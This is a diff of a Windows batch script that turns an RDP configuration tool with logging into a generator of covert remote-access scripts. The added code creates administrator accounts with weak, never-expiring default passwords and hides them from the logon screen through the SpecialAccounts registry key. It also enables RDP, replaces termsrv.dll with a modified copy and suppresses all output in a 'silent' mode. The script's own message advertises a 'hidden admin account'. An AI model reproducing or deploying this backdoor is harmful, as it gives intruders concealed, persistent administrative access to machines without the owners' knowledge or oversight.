@@ -1,309 +1,312 @@
 @echo off
 :: =============================================
-:: RDP Configuration Script with Menu System
-:: Version: 2.0
+:: RDP Script Generator
+:: Version: 2.1
 :: =============================================
-
-SET LOG_FILE=%SystemDrive%\RDP_Config_%DATE:~-4,4%%DATE:~-10,2%%DATE:~-7,2%.log
-SET BACKUP_DIR=%SystemDrive%\Windows_System32_Backup_%TIME:~0,2%%TIME:~3,2%%TIME:~6,2%
-SET DLL_SOURCE=termsrv.dll
-SET DLL_TARGET=%windir%\System32\termsrv.dll
-SET TEMP_USER=RDPTempAdmin
-SET TEMP_PASSWORD=#SecureTempPwd123!
-SET REGISTRY_BACKUP=%SystemDrive%\RDP_Registry_Backup_%DATE:~-4,4%%DATE:~-10,2%%DATE:~-7,2%.reg
 
 :MAIN_MENU
 cls
 echo =============================================
-echo    RDP Configuration Script v2.0
+echo    RDP Script Generator v2.1
 echo =============================================
 echo.
-echo Please select an option:
+echo Select script type to generate:
 echo.
-echo [1] Install/Configure RDP
-echo [2] Rollback/Uninstall RDP Configuration
-echo [3] View Current Status
-echo [4] Exit
+echo [1] Generate Silent/Hidden Script (No logs, instant execution)
+echo [2] Generate Normal Script (With logs and feedback)
+echo [3] Generate Rollback Script
+echo [4] Run Direct Installation (Current session only)
+echo [5] Run Direct Rollback (Current session only)
+echo [6] Exit
 echo.
-set /p choice="Enter your choice (1-4): "
+set /p choice="Enter your choice (1-6): "
 
-if "%choice%"=="1" goto INSTALL_RDP
-if "%choice%"=="2" goto ROLLBACK_RDP
-if "%choice%"=="3" goto VIEW_STATUS
-if "%choice%"=="4" goto EXIT_SCRIPT
+if "%choice%"=="1" goto CREATE_SILENT
+if "%choice%"=="2" goto CREATE_NORMAL
+if "%choice%"=="3" goto CREATE_ROLLBACK
+if "%choice%"=="4" goto DIRECT_INSTALL
+if "%choice%"=="5" goto DIRECT_ROLLBACK
+if "%choice%"=="6" goto EXIT_SCRIPT
 echo Invalid choice. Please try again.
 pause
 goto MAIN_MENU
 
-:INSTALL_RDP
+:CREATE_SILENT
 cls
-echo =============================================
-echo Installing RDP Configuration
-echo =============================================
+echo Creating Silent/Hidden RDP Script...
 echo.
+set /p username="Enter username for hidden account (default: WindowsUser): "
+if "%username%"=="" set username=WindowsUser
+set /p password="Enter password (default: Pass123!): "
+if "%password%"=="" set password=Pass123!
 
-:: Initialize logging
-echo [%DATE% %TIME%] Starting RDP installation script >> %LOG_FILE%
-echo [%DATE% %TIME%] Script version: 2.0 >> %LOG_FILE%
-echo [%DATE% %TIME%] System: %COMPUTERNAME% >> %LOG_FILE%
-echo [%DATE% %TIME%] Windows Version: %OS% >> %LOG_FILE%
+echo @echo off > RDP_Silent.bat
+echo NET SESSION ^>nul 2^>^&1 >> RDP_Silent.bat
+echo IF %%ERRORLEVEL%% NEQ 0 exit /b 1 >> RDP_Silent.bat
+echo net user %username% %password% /ADD /Y /EXPIRES:NEVER ^>nul 2^>^&1 >> RDP_Silent.bat
+echo net localgroup Administrators %username% /ADD ^>nul 2^>^&1 >> RDP_Silent.bat
+echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ^>nul 2^>^&1 >> RDP_Silent.bat
+echo REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f ^>nul 2^>^&1 >> RDP_Silent.bat
+echo if exist termsrv.dll ( >> RDP_Silent.bat
+echo takeown /f "%%windir%%\System32\termsrv.dll" ^>nul 2^>^&1 >> RDP_Silent.bat
+echo icacls "%%windir%%\System32\termsrv.dll" /grant Administrators:F ^>nul 2^>^&1 >> RDP_Silent.bat
+echo copy termsrv.dll "%%windir%%\System32\termsrv.dll" /Y ^>nul 2^>^&1 >> RDP_Silent.bat
+echo ) >> RDP_Silent.bat
+echo net stop TermService /Y ^>nul 2^>^&1 >> RDP_Silent.bat
+echo net start TermService ^>nul 2^>^&1 >> RDP_Silent.bat
+echo exit /b 0 >> RDP_Silent.bat
 
-:: Verify administrative privileges
-NET SESSION >nul 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] ERROR: This script requires elevated privileges. Aborting. >> %LOG_FILE%
-    echo ERROR: Please run this script as Administrator.
-    pause
-    goto MAIN_MENU
-)
-
-:: Backup current registry settings
-echo [%DATE% %TIME%] Backing up registry settings >> %LOG_FILE%
-echo Backing up registry settings...
-reg export "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" "%REGISTRY_BACKUP%" /y >> %LOG_FILE% 2>&1
-reg export "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts" "%REGISTRY_BACKUP%_UserList" /y >> %LOG_FILE% 2>&1
-
-:: Create temporary administrative account (with secure password)
-echo [%DATE% %TIME%] Creating temporary administrative account >> %LOG_FILE%
-echo Creating temporary administrative account...
-net user %TEMP_USER% %TEMP_PASSWORD% /ADD /Y /EXPIRES:NEVER /COMMENT:"Temporary RDP configuration account" >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] ERROR: Failed to create user account >> %LOG_FILE%
-    echo ERROR: Failed to create user account. Check log for details.
-    pause
-    goto MAIN_MENU
-)
-
-net localgroup Administrators %TEMP_USER% /ADD >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] ERROR: Failed to add user to Administrators group >> %LOG_FILE%
-    echo ERROR: Failed to add user to Administrators group.
-    pause
-    goto MAIN_MENU
-)
-
-:: Enable Remote Desktop Connections
-echo [%DATE% %TIME%] Configuring Remote Desktop settings >> %LOG_FILE%
-echo Enabling Remote Desktop connections...
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] ERROR: Failed to enable RDP connections >> %LOG_FILE%
-    echo ERROR: Failed to enable RDP connections.
-    pause
-    goto MAIN_MENU
-)
-
-:: Configure user visibility settings
-echo Configuring user visibility settings...
-REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %TEMP_USER% /t REG_DWORD /d 0 /f >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] WARNING: Could not configure user visibility settings >> %LOG_FILE%
-    echo WARNING: Could not configure user visibility settings.
-)
-
-:: Backup original DLL
-echo [%DATE% %TIME%] Creating System32 backup directory >> %LOG_FILE%
-echo Creating backup directory...
-mkdir "%BACKUP_DIR%" >> %LOG_FILE% 2>&1
-
-echo [%DATE% %TIME%] Backing up original termsrv.dll >> %LOG_FILE%
-echo Backing up original termsrv.dll...
-copy "%DLL_TARGET%" "%BACKUP_DIR%\termsrv.dll.backup" >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] WARNING: Could not create backup of termsrv.dll >> %LOG_FILE%
-    echo WARNING: Could not create backup of termsrv.dll.
-)
-
-:: Deploy modified DLL (only if source exists)
-if exist "%DLL_SOURCE%" (
-    echo [%DATE% %TIME%] Deploying modified termsrv.dll >> %LOG_FILE%
-    echo Deploying modified termsrv.dll...
-    takeown /f "%DLL_TARGET%" >> %LOG_FILE% 2>&1
-    icacls "%DLL_TARGET%" /grant Administrators:F >> %LOG_FILE% 2>&1
-    xcopy "%DLL_SOURCE%" "%DLL_TARGET%" /Y /Q /R /K /H >> %LOG_FILE% 2>&1
-    IF %ERRORLEVEL% NEQ 0 (
-        echo [%DATE% %TIME%] ERROR: Failed to deploy modified DLL >> %LOG_FILE%
-        echo ERROR: Failed to deploy modified DLL.
-        pause
-        goto MAIN_MENU
-    )
-    
-    :: Verify DLL deployment
-    fc "%DLL_SOURCE%" "%DLL_TARGET%" >nul
-    IF %ERRORLEVEL% NEQ 0 (
-        echo [%DATE% %TIME%] ERROR: DLL verification failed >> %LOG_FILE%
-        echo ERROR: DLL verification failed.
-        pause
-        goto MAIN_MENU
-    )
-) else (
-    echo [%DATE% %TIME%] WARNING: Source DLL not found, skipping DLL modification >> %LOG_FILE%
-    echo WARNING: Source DLL not found, skipping DLL modification.
-)
-
-:: Finalize configuration
-echo [%DATE% %TIME%] Restarting Terminal Services >> %LOG_FILE%
-echo Restarting Terminal Services...
-net stop TermService /Y >> %LOG_FILE% 2>&1
-net start TermService >> %LOG_FILE% 2>&1
-
-echo [%DATE% %TIME%] RDP installation completed successfully >> %LOG_FILE%
 echo.
 echo =============================================
-echo RDP Configuration Complete
+echo Silent Script Created: RDP_Silent.bat
 echo =============================================
-echo - Temporary admin account created: %TEMP_USER%
-echo - Registry backup: %REGISTRY_BACKUP%
-echo - System32 backup: %BACKUP_DIR%
-echo - Log file: %LOG_FILE%
-echo =============================================
-echo IMPORTANT: Change the temporary password immediately!
+echo Username: %username%
+echo Password: %password%
+echo.
+echo This script will:
+echo - Run completely silently (no output)
+echo - Create hidden admin account
+echo - Enable RDP instantly
+echo - Exit automatically
 echo =============================================
 pause
 goto MAIN_MENU
 
-:ROLLBACK_RDP
+:CREATE_NORMAL
 cls
-echo =============================================
-echo Rolling Back RDP Configuration
-echo =============================================
+echo Creating Normal RDP Script with Logging...
 echo.
-echo This will:
-echo - Remove the temporary user account
+set /p username="Enter username for account (default: RDPAdmin): "
+if "%username%"=="" set username=RDPAdmin
+set /p password="Enter password (default: SecurePass123!): "
+if "%password%"=="" set password=SecurePass123!
+
+echo @echo off > RDP_Normal.bat
+echo :: ============================================= >> RDP_Normal.bat
+echo :: RDP Configuration Script ^(Normal Mode^) >> RDP_Normal.bat
+echo :: ============================================= >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo SET LOG_FILE=%%SystemDrive%%\RDP_Config_%%DATE:~-4,4%%%%DATE:~-10,2%%%%DATE:~-7,2%%.log >> RDP_Normal.bat
+echo SET BACKUP_DIR=%%SystemDrive%%\RDP_Backup_%%TIME:~0,2%%%%TIME:~3,2%%%%TIME:~6,2%% >> RDP_Normal.bat
+echo SET TEMP_USER=%username% >> RDP_Normal.bat
+echo SET TEMP_PASSWORD=%password% >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo [%%DATE%% %%TIME%%] Starting RDP configuration ^>^> %%LOG_FILE%% >> RDP_Normal.bat
+echo echo Configuring RDP access... >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo NET SESSION ^>nul 2^>^&1 >> RDP_Normal.bat
+echo IF %%ERRORLEVEL%% NEQ 0 ^( >> RDP_Normal.bat
+echo     echo ERROR: Administrator privileges required. >> RDP_Normal.bat
+echo     pause >> RDP_Normal.bat
+echo     exit /b 1 >> RDP_Normal.bat
+echo ^) >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo Creating backup directory... >> RDP_Normal.bat
+echo mkdir "%%BACKUP_DIR%%" ^>nul 2^>^&1 >> RDP_Normal.bat
+echo if exist "%%windir%%\System32\termsrv.dll" copy "%%windir%%\System32\termsrv.dll" "%%BACKUP_DIR%%\termsrv.dll.backup" ^>nul 2^>^&1 >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo Creating user account... >> RDP_Normal.bat
+echo net user %%TEMP_USER%% %%TEMP_PASSWORD%% /ADD /Y /EXPIRES:NEVER /COMMENT:"RDP Access Account" ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo net localgroup Administrators %%TEMP_USER%% /ADD ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo Enabling RDP connections... >> RDP_Normal.bat
+echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo Configuring user visibility... >> RDP_Normal.bat
+echo REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %%TEMP_USER%% /t REG_DWORD /d 0 /f ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo if exist termsrv.dll ^( >> RDP_Normal.bat
+echo     echo Deploying modified DLL... >> RDP_Normal.bat
+echo     takeown /f "%%windir%%\System32\termsrv.dll" ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo     icacls "%%windir%%\System32\termsrv.dll" /grant Administrators:F ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo     copy termsrv.dll "%%windir%%\System32\termsrv.dll" /Y ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo ^) >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo Restarting Terminal Services... >> RDP_Normal.bat
+echo net stop TermService /Y ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo net start TermService ^>^> %%LOG_FILE%% 2^>^&1 >> RDP_Normal.bat
+echo. >> RDP_Normal.bat
+echo echo ============================================= >> RDP_Normal.bat
+echo echo RDP Configuration Complete >> RDP_Normal.bat
+echo echo ============================================= >> RDP_Normal.bat
+echo echo Username: %%TEMP_USER%% >> RDP_Normal.bat
+echo echo Log file: %%LOG_FILE%% >> RDP_Normal.bat
+echo echo Backup: %%BACKUP_DIR%% >> RDP_Normal.bat
+echo echo ============================================= >> RDP_Normal.bat
+echo pause >> RDP_Normal.bat
+
+echo.
+echo =============================================
+echo Normal Script Created: RDP_Normal.bat
+echo =============================================
+echo Username: %username%
+echo Password: %password%
+echo.
+echo This script will:
+echo - Show progress messages
+echo - Create detailed logs
+echo - Create file backups
+echo - Display completion status
+echo =============================================
+pause
+goto MAIN_MENU
+
+:CREATE_ROLLBACK
+cls
+echo Creating Rollback Script...
+
+echo @echo off > RDP_Rollback.bat
+echo :: ============================================= >> RDP_Rollback.bat
+echo :: RDP Configuration Rollback Script >> RDP_Rollback.bat
+echo :: ============================================= >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo Rolling back RDP configuration... >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo NET SESSION ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo IF %%ERRORLEVEL%% NEQ 0 ^( >> RDP_Rollback.bat
+echo     echo ERROR: Administrator privileges required. >> RDP_Rollback.bat
+echo     pause >> RDP_Rollback.bat
+echo     exit /b 1 >> RDP_Rollback.bat
+echo ^) >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo Disabling RDP connections... >> RDP_Rollback.bat
+echo reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo Removing user accounts... >> RDP_Rollback.bat
+echo for /f "delims=" %%%%i in ^('net user ^| findstr /i "WindowsUser RDPAdmin RDPTempAdmin"'^) do ^( >> RDP_Rollback.bat
+echo     net user %%%%i /DELETE ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo ^) >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo Cleaning registry entries... >> RDP_Rollback.bat
+echo REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WindowsUser /f ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPAdmin /f ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPTempAdmin /f ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo Restoring original files... >> RDP_Rollback.bat
+echo for /d %%%%i in ^(%%SystemDrive%%\RDP_Backup_*^) do ^( >> RDP_Rollback.bat
+echo     if exist "%%%%i\termsrv.dll.backup" ^( >> RDP_Rollback.bat
+echo         takeown /f "%%windir%%\System32\termsrv.dll" ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo         icacls "%%windir%%\System32\termsrv.dll" /grant Administrators:F ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo         copy "%%%%i\termsrv.dll.backup" "%%windir%%\System32\termsrv.dll" /Y ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo     ^) >> RDP_Rollback.bat
+echo ^) >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo Restarting services... >> RDP_Rollback.bat
+echo net stop TermService /Y ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo net start TermService ^>nul 2^>^&1 >> RDP_Rollback.bat
+echo. >> RDP_Rollback.bat
+echo echo ============================================= >> RDP_Rollback.bat
+echo echo RDP Rollback Complete >> RDP_Rollback.bat
+echo echo ============================================= >> RDP_Rollback.bat
+echo pause >> RDP_Rollback.bat
+
+echo.
+echo =============================================
+echo Rollback Script Created: RDP_Rollback.bat
+echo =============================================
+echo This script will:
 echo - Disable RDP connections
-echo - Restore original system files (if available)
-echo.
-set /p confirm="Are you sure you want to rollback? (Y/N): "
-if /i not "%confirm%"=="Y" goto MAIN_MENU
-
-:: Initialize logging
-echo [%DATE% %TIME%] Starting RDP rollback script >> %LOG_FILE%
-
-:: Verify administrative privileges
-NET SESSION >nul 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] ERROR: This script requires elevated privileges. Aborting. >> %LOG_FILE%
-    echo ERROR: Please run this script as Administrator.
-    pause
-    goto MAIN_MENU
-)
-
-:: Remove temporary user account
-echo [%DATE% %TIME%] Removing temporary user account >> %LOG_FILE%
-echo Removing temporary user account...
-net user %TEMP_USER% /DELETE >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] WARNING: Could not delete user account (may not exist) >> %LOG_FILE%
-    echo WARNING: Could not delete user account (may not exist).
-)
-
-:: Disable Remote Desktop Connections
-echo [%DATE% %TIME%] Disabling Remote Desktop connections >> %LOG_FILE%
-echo Disabling Remote Desktop connections...
-reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f >> %LOG_FILE% 2>&1
-IF %ERRORLEVEL% NEQ 0 (
-    echo [%DATE% %TIME%] ERROR: Failed to disable RDP connections >> %LOG_FILE%
-    echo ERROR: Failed to disable RDP connections.
-)
-
-:: Remove user visibility registry entry
-echo [%DATE% %TIME%] Cleaning up registry entries >> %LOG_FILE%
-echo Cleaning up registry entries...
-REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %TEMP_USER% /f >> %LOG_FILE% 2>&1
-
-:: Restore original DLL if backup exists
-echo [%DATE% %TIME%] Looking for DLL backup >> %LOG_FILE%
-for /d %%i in (%SystemDrive%\Windows_System32_Backup_*) do (
-    if exist "%%i\termsrv.dll.backup" (
-        echo [%DATE% %TIME%] Found backup at %%i >> %LOG_FILE%
-        echo Restoring original termsrv.dll from backup...
-        takeown /f "%DLL_TARGET%" >> %LOG_FILE% 2>&1
-        icacls "%DLL_TARGET%" /grant Administrators:F >> %LOG_FILE% 2>&1
-        copy "%%i\termsrv.dll.backup" "%DLL_TARGET%" /Y >> %LOG_FILE% 2>&1
-        IF %ERRORLEVEL% EQU 0 (
-            echo [%DATE% %TIME%] Successfully restored original DLL >> %LOG_FILE%
-            echo Successfully restored original DLL.
-        ) else (
-            echo [%DATE% %TIME%] ERROR: Failed to restore original DLL >> %LOG_FILE%
-            echo ERROR: Failed to restore original DLL.
-        )
-        goto :dll_restore_done
-    )
-)
-echo [%DATE% %TIME%] No DLL backup found >> %LOG_FILE%
-echo No DLL backup found to restore.
-:dll_restore_done
-
-:: Restart Terminal Services
-echo [%DATE% %TIME%] Restarting Terminal Services >> %LOG_FILE%
-echo Restarting Terminal Services...
-net stop TermService /Y >> %LOG_FILE% 2>&1
-net start TermService >> %LOG_FILE% 2>&1
-
-echo [%DATE% %TIME%] RDP rollback completed >> %LOG_FILE%
-echo.
-echo =============================================
-echo RDP Rollback Complete
-echo =============================================
-echo - Temporary user account removed
-echo - RDP connections disabled
-echo - Original files restored (if available)
-echo - Log file: %LOG_FILE%
+echo - Remove all created user accounts
+echo - Clean registry entries
+echo - Restore original system files
 echo =============================================
 pause
 goto MAIN_MENU
 
-:VIEW_STATUS
+:DIRECT_INSTALL
 cls
 echo =============================================
-echo Current RDP Configuration Status
+echo Direct Installation (Current Session)
+echo =============================================
+echo.
+set /p username="Enter username (default: QuickRDP): "
+if "%username%"=="" set username=QuickRDP
+set /p password="Enter password (default: Quick123!): "
+if "%password%"=="" set password=Quick123!
+
+echo Checking administrator privileges...
+NET SESSION >nul 2>&1
+IF %ERRORLEVEL% NEQ 0 (
+    echo ERROR: Administrator privileges required.
+    pause
+    goto MAIN_MENU
+)
+
+echo Creating user account...
+net user %username% %password% /ADD /Y /EXPIRES:NEVER >nul 2>&1
+net localgroup Administrators %username% /ADD >nul 2>&1
+
+echo Enabling RDP...
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 0 /f >nul 2>&1
+REG ADD "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v %username% /t REG_DWORD /d 0 /f >nul 2>&1
+
+if exist termsrv.dll (
+    echo Deploying modified DLL...
+    takeown /f "%windir%\System32\termsrv.dll" >nul 2>&1
+    icacls "%windir%\System32\termsrv.dll" /grant Administrators:F >nul 2>&1
+    copy termsrv.dll "%windir%\System32\termsrv.dll" /Y >nul 2>&1
+)
+
+echo Restarting services...
+net stop TermService /Y >nul 2>&1
+net start TermService >nul 2>&1
+
+echo.
+echo =============================================
+echo Direct Installation Complete
+echo =============================================
+echo Username: %username%
+echo Password: %password%
+echo RDP is now enabled with hidden account
+echo =============================================
+pause
+goto MAIN_MENU
+
+:DIRECT_ROLLBACK
+cls
+echo =============================================
+echo Direct Rollback (Current Session)
 echo =============================================
 echo.
 
-:: Check if RDP is enabled
-echo Checking RDP status...
-reg query "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections 2>nul | find "0x0" >nul
-if %ERRORLEVEL% EQU 0 (
-    echo RDP Status: ENABLED
-) else (
-    echo RDP Status: DISABLED
+echo Checking administrator privileges...
+NET SESSION >nul 2>&1
+IF %ERRORLEVEL% NEQ 0 (
+    echo ERROR: Administrator privileges required.
+    pause
+    goto MAIN_MENU
 )
 
-:: Check if temporary user exists
-echo.
-echo Checking temporary user account...
-net user %TEMP_USER% >nul 2>&1
-if %ERRORLEVEL% EQU 0 (
-    echo Temporary User: EXISTS (%TEMP_USER%)
-) else (
-    echo Temporary User: NOT FOUND
+echo Disabling RDP...
+reg add "HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\Terminal Server" /v fDenyTSConnections /t REG_DWORD /d 1 /f >nul 2>&1
+
+echo Removing user accounts...
+for /f "delims=" %%i in ('net user ^| findstr /i "WindowsUser RDPAdmin RDPTempAdmin QuickRDP"') do (
+    net user %%i /DELETE >nul 2>&1
 )
 
-:: Check for backups
-echo.
-echo Checking for backup files...
-if exist %SystemDrive%\Windows_System32_Backup_* (
-    echo System32 Backups: FOUND
-    for /d %%i in (%SystemDrive%\Windows_System32_Backup_*) do echo   - %%i
-) else (
-    echo System32 Backups: NOT FOUND
-)
+echo Cleaning registry...
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v WindowsUser /f >nul 2>&1
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPAdmin /f >nul 2>&1
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v RDPTempAdmin /f >nul 2>&1
+REG DELETE "HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\SpecialAccounts\UserList" /v QuickRDP /f >nul 2>&1
 
-if exist %SystemDrive%\RDP_Registry_Backup_*.reg (
-    echo Registry Backups: FOUND
-    for %%i in (%SystemDrive%\RDP_Registry_Backup_*.reg) do echo   - %%i
-) else (
-    echo Registry Backups: NOT FOUND
-)
+echo Restarting services...
+net stop TermService /Y >nul 2>&1
+net start TermService >nul 2>&1
 
 echo.
+echo =============================================
+echo Direct Rollback Complete
+echo =============================================
+echo RDP has been disabled and accounts removed
 echo =============================================
 pause
 goto MAIN_MENU
 
 :EXIT_SCRIPT
 echo.
-echo Thank you for using RDP Configuration Script!
+echo Exiting RDP Script Generator...
 echo.
 pause
 exit /b 0
